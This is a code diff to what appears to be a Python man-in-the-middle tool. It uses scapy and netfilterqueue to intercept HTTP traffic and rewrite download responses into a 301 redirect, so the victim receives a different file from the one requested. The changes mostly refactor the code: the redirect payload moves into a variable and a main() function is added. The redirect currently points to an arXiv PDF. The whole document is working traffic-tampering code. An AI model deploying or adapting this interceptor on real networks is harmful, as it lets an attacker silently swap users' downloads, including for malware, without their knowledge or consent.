@@ -5,6 +5,7 @@ from scapy.packet import Raw
 from scapy.layers.inet import IP, TCP
 
 ack_list = []
+redirect = b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n" 
 
 def set_load(packet, load):
     print(packet.show())
@@ -31,17 +32,18 @@ def process_packet(packet):
             if scapy_packet[TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[TCP].seq)
                 print("[+] Modifying download file")
-                print(scapy_packet.show())
-                mod_packet = set_load(scapy_packet, b"HTTP/1.1 301 Moved Permanently\nLocation: https://arxiv.org/pdf/2105.14943.pdf\n\n")
+                mod_packet = set_load(scapy_packet, redirect)
 
+                print(scapy_packet.show())
                 packet.set_payload(bytes(mod_packet))
 
     # print(packet.get_payload())
     packet.accept()
 
-
-if __name__ == "__main__":
+def main():
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
     queue.run()
 
+if __name__ == "__main__":
+    main()
